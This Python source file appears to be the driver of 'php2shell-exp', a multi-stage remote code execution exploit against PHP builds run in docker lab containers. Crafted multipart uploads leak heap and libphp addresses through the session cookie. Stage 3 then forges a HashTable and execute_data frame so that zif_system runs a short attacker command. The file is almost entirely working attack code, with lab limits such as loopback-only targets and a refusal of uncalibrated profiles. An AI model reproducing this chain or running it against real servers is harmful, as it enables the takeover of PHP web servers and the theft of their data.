#!/usr/bin/env python3
"""php2shell-exp -- profile-driven php2shell chain.

    python3 chain.py --target 8.4.26            # run the chain -> PROOF / NO PROOF
    python3 chain.py calibrate --target 8.4.26  # measure profile JSON
    python3 chain.py doctor --target 8.4.26     # image / symbols / container facts
    python3 chain.py up|down --target 8.4.26

Everything that differs between PHP builds comes from profiles/<target>.json;
libphp addresses are always resolved by symbol name (symbols.py), never
hardcoded here.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
from collections import Counter
from datetime import datetime

import profile as profile_mod
import symbols as symbols_mod

REPO = os.path.dirname(os.path.abspath(__file__))
COMPOSE = os.path.join(REPO, "docker", "compose.yml")
LOG_DIR = os.path.join(REPO, "logs")
OUT_ROOT = os.path.join(REPO, "out")

# Zend MM / zend_string layout constants shared by all builds.
ZEND_STRING_HDR = 0x18      # zend_refcounted_h gc (8) + h (8) + len (8)
HT_SPRAY_BYTES = 167        # live field-value zend_string carrying the fake HashTable
HT_ARM_BIG = 0x1000         # forged zend_string length used by the stage-1 leak
FORGE_LEN_OFF = 0x10        # offset of zend_string.len inside a 79-byte raw value
FORGE_DATA_OFF = 0x18       # offset of zend_string.val inside a 79-byte raw value
MAX_CMD = 14                # 167-byte carrier - 0x98 frame - NUL
IS_STRING = 6
IS_REFERENCE = 10
IS_ARRAY_EX = 0x307

# Exit codes shared with p2s.py (see README).
EXIT_OK = 0
EXIT_FAILED = 1
EXIT_OPTION = 2
EXIT_UNKNOWN = 3
EXIT_REFUSED = 4            # affected/stage-1 blocked, or uncalibrated profile


def log(msg: str) -> None:
    print(msg, flush=True)


def calibration_refusal(prof: dict) -> str | None:
    """Return why a profile must not reach stage 3, or None when it may.

    A seed profile has no measured `heap.htdata_offset` (or says so in
    `calibration.generated_by`).  Running stage 3 with it would forge a
    fake HashTable at an address nobody measured, so `chain.py run` and
    `p2s.py exploit` refuse before touching the target.  `check` and
    `doctor` stay allowed: they only exercise stage 1 / read build facts.
    """
    heap = prof.get("heap") or {}
    htdata = heap.get("htdata_offset", 0)
    gen = str((prof.get("calibration") or {}).get("generated_by", ""))
    reasons: list[str] = []
    if not isinstance(htdata, int) or htdata == 0:
        reasons.append("heap.htdata_offset is 0 (stage-3 HTDATA address unmeasured)")
    if "not calibrated" in gen.lower():
        reasons.append(f"calibration.generated_by={gen!r}")
    if not reasons:
        return None
    return (
        f"profile {prof.get('target', '?')} is a seed / not calibrated "
        f"({'; '.join(reasons)}); stage 3 would forge pointers from unmeasured "
        "geometry. `check` and `doctor` are still allowed; run "
        f"`chain.py calibrate --target {prof.get('target', '<target>')}` first."
    )


def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            out += b'; filename="' + fn + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def field(name, data: bytes) -> dict:
    return {"name": name, "data": data}


def file_field(name: str = "f", filename: str = "a.txt", data: bytes = b"A" * 64) -> dict:
    return {"name": name, "filename": filename, "data": data}


class Transport:
    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True,
                 user_agent: str | None = None):
        self.user_agent = user_agent
        u = urllib.parse.urlsplit(url)
        if u.scheme != "http":
            raise SystemExit("target URL must be http:// (lab is loopback-only)")
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or 80
        self.path = u.path or "/"
        self.timeout = timeout
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            log(msg)

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last  # type: ignore[misc]

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        extra = "".join(f"{k}: {v}\r\n" for k, v in (extra_headers or {}).items())
        ua = f"User-Agent: {self.user_agent}\r\n" if self.user_agent else ""
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{ua}"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        data = bytearray()

        def reader() -> None:
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        th = threading.Thread(target=reader, daemon=True)
        th.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass  # the worker may abort while the body is still in flight
            th.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*)", resp)
    if not m:
        return b""
    value = m.group(1).split(b";", 1)[0].strip()
    return urllib.parse.unquote_to_bytes(value.decode("latin1"))


def chunk_base_from_cookie(raw: bytes, align: int, lo: int, hi: int,
                           min_hits: int = 8, exclude: int = 0) -> int:
    """Stage 1 oracle: 2 MiB-aligned mode of heap pointers in the cookie."""
    if len(raw) < 64:
        return 0
    c: Counter[int] = Counter()
    excluded = exclude & ~(align - 1) if exclude else 0
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if lo <= v < hi:
            base = v & ~(align - 1)
            if excluded and base == excluded:
                continue
            c[base] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= min_hits else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int, lo: int, hi: int) -> int:
    """Stage 2 oracle: cookie starts at PS(id)+0x18 = nNextFreeElement|pDestructor."""
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (lo <= p < hi):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


def build_fake_ht(cmd: bytes, htdata: int, ctor: int) -> bytes:
    """167-byte fake HashTable + execute_data frame, carried in a live zend_string."""
    if len(cmd) > MAX_CMD:
        raise SystemExit(
            f"command is {len(cmd)} bytes; the {HT_SPRAY_BYTES}-byte carrier allows "
            f"at most {MAX_CMD} (e.g. 'sh</out/c')"
        )
    ht = bytearray(b"\x00" * HT_SPRAY_BYTES)
    struct.pack_into("<II", ht, 0x00, 1, 7)                 # gc: rc=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)         # arData -> execute_data
    struct.pack_into("<II", ht, 0x18, 1, 1)                 # nNumUsed/nNumOfElements
    struct.pack_into("<II", ht, 0x20, 8, 0)                 # nTableSize/nInternalPointer
    struct.pack_into("<Q", ht, 0x28, 0)                     # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, ctor)                  # pDestructor
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)                 # opline
    struct.pack_into("<Q", ht, E + 0x08, 0)                 # call
    struct.pack_into("<Q", ht, E + 0x10, ctor)              # return_value
    struct.pack_into("<Q", ht, E + 0x18, 0)                 # func
    struct.pack_into("<Q", ht, E + 0x20, 0)                 # This.value
    struct.pack_into("<I", ht, E + 0x28, 0)                 # This.u1.type_info
    struct.pack_into("<I", ht, E + 0x2C, 1)                 # num_args = 1
    struct.pack_into("<Q", ht, E + 0x30, 0)                 # prev_execute_data
    struct.pack_into("<Q", ht, E + 0x38, 0)                 # symbol_table
    struct.pack_into("<I", ht, E + 0x40, 0)                 # call_info
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)     # arg1 value
    struct.pack_into("<I", ht, E + 0x58, IS_STRING)         # arg1 type
    struct.pack_into("<II", ht, 0x80, 1, 0x106)             # fake zend_string gc
    struct.pack_into("<Q", ht, 0x88, 0)                     # h
    struct.pack_into("<Q", ht, 0x90, len(cmd))              # len
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def build_fake_ref(htdata: int, ref_type: int = IS_ARRAY_EX,
                   gc_type: int = IS_REFERENCE, gc_refcount: int = 1,
                   length: int = 55) -> bytes:
    """55-byte value whose 56-byte raw buffer starts at R0-0x10."""
    ref = bytearray(b"X" * length)
    struct.pack_into("<II", ref, 0x10, gc_refcount, gc_type)
    struct.pack_into("<Q", ref, 0x18, htdata)
    struct.pack_into("<I", ref, 0x20, ref_type)
    struct.pack_into("<I", ref, 0x24, 0)
    struct.pack_into("<Q", ref, 0x28, 0)
    return bytes(ref)


def build_live_ref(htdata: int, ref_type: int = IS_ARRAY_EX,
                   length: int = 31, gc_type: int = IS_REFERENCE) -> bytes:
    """Value string whose data starts at R0 and carries a full zend_reference."""
    v = bytearray(b"R" * length)
    struct.pack_into("<Q", v, 0x00, (gc_type << 32) | 1)
    struct.pack_into("<Q", v, 0x08, htdata)
    struct.pack_into("<I", v, 0x10, ref_type)
    struct.pack_into("<I", v, 0x14, 0)
    return bytes(v)


class Chain:
    def __init__(self, prof: dict, syms: dict[str, int], verbose: bool = True,
                 container: str | None = None, timeout: float = 40.0):
        self.p = prof
        self.syms = syms
        self.v = verbose
        self.container = container or prof["container"]
        ua = (prof.get("http") or {}).get("user_agent")
        self.t = Transport(prof["url"], timeout=timeout, verbose=verbose, user_agent=ua)
        self.heap = prof["heap"]
        self.st3 = prof["stage3"]
        self.big_mb = int(self.st3.get("big_mb", 12))
        self.sid_len = int(self.st3.get("sid_len", 19))
        self.progress_len = int(self.st3.get("progress_len", 3))

    # ---------------- primitives ----------------
    def _log(self, msg: str) -> None:
        if self.v:
            log(msg)

    @staticmethod
    def _sid(opts: dict) -> bytes:
        """Session id used by the leak/execute B request.

        Inbound ids are accepted at 1..256 chars from [A-Za-z0-9,-],
        independent of session.sid_length. 8.2.34's blocker is
        php_session_reset_id() clearing send_cookie after a failed cookie
        send, not id validation. Profiles set `<stage>.sid_len` for request
        shaping.
        """
        if opts.get("sid"):
            return str(opts["sid"]).encode()
        n = int(opts.get("sid_len", 0))
        return b"a" * n if n else b"attacksessionid0001"

    def _big(self) -> dict:
        return field("big", b"B" * (self.big_mb * 1024 * 1024))

    def _pads(self) -> list[dict]:
        out = []
        for i, (nl, vl) in enumerate(self.st3.get("pads", [])):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            out.append(field(name, b"V" * vl))
        return out

    def _arm(self, fields: int, name_fmt: str, value_len: int, boundary: bytes,
             extra_headers: dict[str, str] | None = None,
             pads: list[dict] | None = None, sid_len: int | None = None,
             progress_len: int | None = None, timeout: float | None = None,
             fillers_first: bool = False, sid_zero: bool = False) -> None:
        sid = b"\x00" if sid_zero else b"a" * (self.sid_len if sid_len is None else sid_len)
        prog = b"p" * (self.progress_len if progress_len is None else progress_len)
        fillers = [field(name_fmt % i, b"x" * value_len) for i in range(fields)]
        # The leak arms put the max_input_vars filler fields before PHPSESSID:
        # the warning flips headers_sent before the session id is generated.
        if fillers_first:
            parts = fillers + [field("PHPSESSID", sid),
                               field("PHP_SESSION_UPLOAD_PROGRESS", prog)]
            parts += pads or []
        else:
            parts = [field("PHPSESSID", sid), field("PHP_SESSION_UPLOAD_PROGRESS", prog)]
            parts += pads or []
            parts += fillers
        parts.append(file_field())
        parts.append(self._big())
        self.t.post(build_multipart(parts, boundary), boundary,
                    read_cap=1 << 20, timeout=timeout or max(90.0, self.t.timeout),
                    extra_headers=extra_headers)

    def rotate(self) -> None:
        """Abort the current worker over HTTP; prefork forks a fresh one."""
        self._log("[*] rotating worker over HTTP")
        bnd = b"S" * 17
        parts = [field(f"f{i:04d}", b"V" * 3000) for i in range(1001)]
        parts += [field("PHPSESSID", b"\x00"), field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        parts += [file_field(), self._big()]
        self.t.post(build_multipart(parts, bnd), bnd, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        bnd = b"BNDRY12345"
        parts = [field("PHPSESSID", b"attacksessionid0001"),
                 field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        self.t.post(build_multipart(parts, bnd), bnd, read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    # ---------------- stage 1: heap leak ----------------
    def stage1(self, fillers: int | None = None) -> int:
        s1 = self.heap["stage1"]
        fillers = int(s1["fillers"] if fillers is None else fillers)
        bnd = b"S" * 17
        arm_value_len = int(s1.get("arm_value_len", 1))
        self._arm(1001, "p%04d", arm_value_len, bnd, fillers_first=True, sid_zero=True)
        time.sleep(0.2)

        parts = [field("PHPSESSID", self._sid(s1)),
                 field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        vlen = int(s1["value_len"])
        for i in range(fillers):
            val = (f"v{i:04d}" + "x" * 44)[:vlen]
            parts.append(field(str(1000 + i), val.encode()))
        forge = bytearray(b"A" * int(s1["forge_len"]))
        struct.pack_into("<Q", forge, FORGE_LEN_OFF, int(s1["forge_len_field"]))
        forge[FORGE_DATA_OFF] = ord("L")
        parts.append(field("1999", bytes(forge)))

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp), int(self.heap["chunk_align"]),
                                      int(self.heap["pointer_lo"]),
                                      int(self.heap["pointer_hi"]))

    # ---------------- combined leak (8.5.x): one cookie, both bases ----------------
    def leak_combined(self) -> tuple[int, int]:
        """One OOM/arm pair + one array-shaped B: libphp base at [8:16], chunk
        base from the arData pointers.  Mirrors the 8.5.11 `barr` leak."""
        c = self.heap.get("combined", {})
        bnd = b"S" * 17
        nvars = int(c.get("nvars", 1001))
        nl1 = int(c.get("name_len", 5))
        nl2 = int(c.get("name_len2", 39))
        mix = int(c.get("name_mix", 0))
        mix_pos = c.get("name_mix_pos", "first")
        vlen_arm = int(c.get("arm_value_len", 39))
        parts = []
        for i in range(nvars):
            is_mix = (i < mix) if mix_pos == "first" else (i >= nvars - mix)
            nl = nl2 if is_mix else nl1
            nm = ("f%0*d" % (max(0, nl - 1), i))[:nl]
            parts.append(field(nm, b"x" * vlen_arm))
        parts += [field("PHPSESSID", b"\x00"),
                  field("PHP_SESSION_UPLOAD_PROGRESS", b"p" * int(c.get("progress_len", 3))),
                  file_field(), self._big()]
        self.t.post(build_multipart(parts, bnd), bnd, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(float(c.get("stage_delay", 0.2)))

        parts = [field("PHPSESSID", c.get("sid", "leaksessionid01").encode()),
                 field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        groups = int(c["groups"])
        target = int(c["target"])
        tcount = int(c["target_count"])
        vlen = int(c.get("value_len", 1))
        for i in range(groups):
            cnt = tcount if i == target else 1
            for j in range(cnt):
                parts.append(field(f"a{i:04d}[{j}]", b"x" * vlen))
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20)
        raw = parse_cookie(resp)
        libphp = libphp_base_from_cookie(raw, self.syms["zval_ptr_dtor"],
                                        int(self.heap["pointer_lo"]),
                                        int(self.heap["pointer_hi"]))
        chunk = chunk_base_from_cookie(raw, int(self.heap["chunk_align"]),
                                       int(self.heap["pointer_lo"]),
                                       int(self.heap["pointer_hi"]),
                                       min_hits=8, exclude=libphp)
        return chunk, libphp

    # ---------------- stage 2: libphp leak ----------------
    def stage2(self, target: int | None = None) -> int:
        s2 = self.heap["stage2"]
        bnd = b"S" * 17
        self._arm(1001, "f%04d", int(s2.get("arm_value_len", 39)), bnd, fillers_first=True, sid_zero=True)
        time.sleep(0.2)

        parts = [field("PHPSESSID", self._sid(s2)),
                 field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        groups = int(s2["groups"])
        target = int(s2["target"] if target is None else target)
        tcount = int(s2["target_count"])
        vlen = int(s2["value_len"])
        for i in range(groups):
            cnt = tcount if i == target else 1
            for j in range(cnt):
                parts.append(field(f"a{i:04d}[{j}]", b"x" * vlen))
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.syms["zval_ptr_dtor"],
                                       int(self.heap["pointer_lo"]),
                                       int(self.heap["pointer_hi"]))

    # ---------------- stage 3: execute ----------------
    def stage3(self, htdata: int, ctor: int, cmd: bytes | None = None,
               pads: list[dict] | None = None, carrier_count: int | None = None,
               spray_count: int | None = None, probe: bool = False) -> None:
        cmd = cmd if cmd is not None else self.p["proof"]["cmd"].encode()
        bnd = b"S" * 17
        extra = None
        if self.st3.get("arm_cookie"):
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self._arm(0, "unused%04d", 1, bnd, extra_headers=extra,
                  pads=pads if pads is not None else self._pads())
        time.sleep(0.3)

        carrier = self.st3["carrier"]
        kind = carrier["kind"]
        clen = int(carrier["len"])
        ccount = int(carrier["count"] if carrier_count is None else carrier_count)
        spray = self.st3["spray"]
        scount = int(spray["count"] if spray_count is None else spray_count)
        name_len = int(spray["name_len"])
        ht = build_fake_ht(cmd, htdata, ctor)

        parts = [field("PHPSESSID", self._sid({**self.st3, "sid_len": self.st3.get("b_sid_len", 0)})),
                 field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        if kind == "patch_low7":
            # Two 15-byte decoy values put the third 40-byte slot on R0; the
            # carrier then rewrites gc and the low 7 bytes of val.value while
            # the reference's val.type (0x307) survives at R0+0x10.
            for i in range(ccount):
                parts.append(field(f"f{i:02d}", b"F" * clen))
            parts.append(field("g00", struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]))
            for i in range(scount):
                parts.append(field(f"a{i:030d}"[:name_len], ht))
        elif kind == "live_reference":
            # mask/fill fields shape the 32-byte bin so a live 31-byte value
            # string's data starts exactly at the freed reference R0.
            mask = carrier.get("mask", {})
            for i in range(int(mask.get("count", 0))):
                parts.append(field(f"m{i:04d}"[:int(mask.get("name_len", 5))],
                                   b"M" * int(mask.get("val_len", 100))))
            fill = carrier.get("fill", {})
            for i in range(int(fill.get("count", 0))):
                parts.append(field(f"F{i:030d}"[:int(fill.get("name_len", 31))],
                                   b"z" * int(fill.get("val_len", 1))))
            live = build_live_ref(htdata, int(carrier.get("ref_type", IS_ARRAY_EX)), clen)
            for i in range(ccount):
                parts.append(field(f"r{i:04d}", live))
            for i in range(scount):
                parts.append(field(f"a{i:030d}"[:name_len], ht))
        else:
            raise SystemExit(f"unknown carrier kind {kind!r}")

        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)

    # ---------------- orchestration ----------------
    def run(self, retries: int = 3, rotate_retries: bool = True) -> int:
        refusal = calibration_refusal(self.p)
        if refusal:
            log(f"REFUSED: {refusal}")
            return EXIT_REFUSED
        cmd = self.p["proof"]["cmd"].encode()
        if len(cmd) > MAX_CMD:
            raise SystemExit(f"proof.cmd is limited to {MAX_CMD} bytes by the 167-byte carrier")
        proof_path = self.proof_host_path()
        os.makedirs(os.path.dirname(proof_path), exist_ok=True)
        try:
            if os.path.exists(proof_path):
                os.unlink(proof_path)
        except OSError:
            pass

        self.rotate()

        chunk = 0
        libphp = 0
        if self.heap.get("leak", "split") == "combined":
            for attempt in range(1, retries + 1):
                self._log(f"[*] combined leak (attempt {attempt}/{retries})")
                chunk, libphp = self.leak_combined()
                if chunk and libphp:
                    self._log(f"[+] chunk base = 0x{chunk:x}")
                    self._log(f"[+] libphp base = 0x{libphp:x}")
                    break
                self._log(f"[-] combined leak incomplete (chunk={chunk:x} libphp={libphp:x})")
                if rotate_retries:
                    self.rotate()
            if not (chunk and libphp):
                log("LEAK_FAILED")
                return 1
            self.rotate()
        else:
            for attempt in range(1, retries + 1):
                self._log(f"[*] stage 1: heap leak (attempt {attempt}/{retries})")
                chunk = self.stage1()
                if chunk:
                    self._log(f"[+] chunk base = 0x{chunk:x}")
                    break
                self._log("[-] heap leak missed")
                if rotate_retries:
                    self.rotate()
            if not chunk:
                log("HEAP_LEAK_FAILED")
                return 1
            self.rotate()

            for attempt in range(1, retries + 1):
                self._log(f"[*] stage 2: libphp leak (attempt {attempt}/{retries})")
                libphp = self.stage2()
                if libphp:
                    self._log(f"[+] libphp base = 0x{libphp:x}")
                    break
                self._log("[-] libphp leak missed")
                if rotate_retries:
                    self.rotate()
            if not libphp:
                log("LIBPHP_LEAK_FAILED")
                return 1
            self.rotate()

        htdata = chunk + int(self.heap["htdata_offset"])
        zif = libphp + self.syms["zif_system"]
        self._log(f"[*] stage 3: HTDATA=0x{htdata:x} ZIF=0x{zif:x}")

        for attempt in range(1, retries + 3):
            try:
                self.stage3(htdata, zif)
            except OSError as e:
                self._log(f"[-] request error: {e}")
            time.sleep(0.8)
            proof = self.read_proof()
            if proof:
                self._log(f"[+] W3 attempt {attempt}")
                log(f"PROOF: {proof}")
                return 0
            self._log(f"[-] stage 3 attempt {attempt} no proof yet")
            if rotate_retries:
                self.rotate()

        log("EXPLOIT_FAILED (no proof)")
        return 1

    def proof_host_path(self) -> str:
        return os.path.join(OUT_ROOT, self.p["target"].replace(".", ""),
                            os.path.basename(self.p["proof"]["file"]))

    def read_proof(self) -> str:
        try:
            with open(self.proof_host_path(), "rb") as f:
                return f.read().decode("latin1").strip()
        except OSError:
            return ""


# ---------------------------------------------------------------- docker glue
def compose(*args: str, check: bool = False) -> subprocess.CompletedProcess:
    return subprocess.run(["docker", "compose", "-f", COMPOSE, *args],
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          text=True, check=check)


def target_port(target: str) -> int:
    try:
        import profile as _p
        return urllib.parse.urlsplit(_p.load(target)["url"]).port or 80
    except SystemExit:
        return 80


def service_name(target: str) -> str:
    return "apache" + target.replace(".", "")


def container_name(target: str) -> str:
    return "php2shell-exp-" + target.replace(".", "")


def http_ok(url: str) -> bool:
    try:
        import urllib.request
        with urllib.request.urlopen(url, timeout=2) as r:
            return r.status == 200
    except Exception:
        return False


def ensure_up(target: str) -> None:
    """Start the container and wait for one plain request to succeed.

    No healthcheck is defined on purpose: periodic probe requests fork
    workers and warm the Zend heap, which changes the multipart layout the
    chain depends on. Readiness is checked from the host, once.
    """
    svc = service_name(target)
    name = container_name(target)
    if http_ok(f"http://127.0.0.1:{target_port(target)}/index.php"):
        return
    log(f"[*] starting {name} ({svc})")
    res = compose("up", "-d", svc)
    if res.returncode != 0:
        log(res.stdout)
        raise SystemExit(f"docker compose up failed for {svc}")
    url = f"http://127.0.0.1:{target_port(target)}/index.php"
    for _ in range(60):
        if http_ok(url):
            return
        time.sleep(1)
    raise SystemExit(f"{name} did not answer on {url}")


def resolve_symbols(prof: dict, keep: bool | None = None) -> dict[str, int]:
    """Always resolve by name; cached values in the profile are only a record."""
    info = symbols_mod.resolve(prof["container"], ["zif_system", "zval_ptr_dtor"],
                               prof["libphp"])
    return info["symbols"]


def load_symbols(prof: dict) -> dict[str, int]:
    try:
        return resolve_symbols(prof)
    except SystemExit as e:
        if "symbols" in prof and prof["symbols"]:
            log(f"[!] symbol resolution failed ({e}); using profile record")
            return prof["symbols"]
        raise


def target_profile(target: str) -> dict:
    prof = profile_mod.load(target)
    if not prof.get("service"):
        prof["service"] = service_name(target)
    return prof


def doctor(target: str) -> int:
    prof = target_profile(target)
    log(f"target      {target}")
    log(f"image       {prof['image']}")
    log(f"container   {prof['container']}")
    log(f"url         {prof['url']}")
    ver = subprocess.run(
        ["docker", "exec", prof["container"], "php", "-r", "echo PHP_VERSION;"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    log(f"php         {ver.stdout.strip() or ver.returncode}")
    info = symbols_mod.resolve(prof["container"], ["zif_system", "zval_ptr_dtor"],
                               prof["libphp"])
    log(f"libphp      {prof['libphp']} sha256={info['sha256'][:16]}...")
    for name, off in info["symbols"].items():
        log(f"  {name:14s} +0x{off:x}")
    log(f"profile     {profile_mod.describe(prof)}")
    return 0


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="php2shell-exp: profile-driven php2shell chain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("action", nargs="?", default="run",
                    choices=("run", "calibrate", "doctor", "up", "down", "verify"))
    ap.add_argument("--target", default="8.4.26", help="PHP version key, e.g. 8.4.26")
    ap.add_argument("--profile", default="", help="profile JSON (default: profiles/<target>.json)")
    ap.add_argument("--cmd", default="", help="override proof command (<=14 bytes)")
    ap.add_argument("--proof-file", default="", help="override in-container proof path")
    ap.add_argument("--url", default="", help="override target URL")
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--no-up", action="store_true", help="do not start the container")
    ap.add_argument("--no-rotate-retries", action="store_true")
    ap.add_argument("--timeout", type=float, default=40.0)
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args(argv)

    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs(OUT_ROOT, exist_ok=True)

    if args.action == "down":
        res = compose("down", service_name(args.target))
        print(res.stdout, end="")
        return res.returncode

    if args.action == "up":
        ensure_up(args.target)
        log(f"OK {container_name(args.target)}")
        return 0

    if args.profile:
        with open(args.profile, "r", encoding="utf-8") as f:
            prof = json.load(f)
    else:
        prof = target_profile(args.target)
    if args.url:
        prof["url"] = args.url
    if args.cmd:
        prof["proof"]["cmd"] = args.cmd
    if args.proof_file:
        prof["proof"]["file"] = args.proof_file

    if args.action == "run":
        refusal = calibration_refusal(prof)
        if refusal:
            log(f"REFUSED: {refusal}")
            return EXIT_REFUSED

    if not args.no_up and args.action in ("run", "calibrate"):
        ensure_up(args.target)

    if args.action == "doctor":
        return doctor(args.target)

    if args.action == "calibrate":
        import calibrate
        return calibrate.run(prof, verbose=not args.quiet, timeout=args.timeout)

    syms = load_symbols(prof)
    chain = Chain(prof, syms, verbose=not args.quiet, timeout=args.timeout)
    if args.no_rotate_retries:
        return chain.run(retries=args.retries, rotate_retries=False)
    return chain.run(retries=args.retries)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
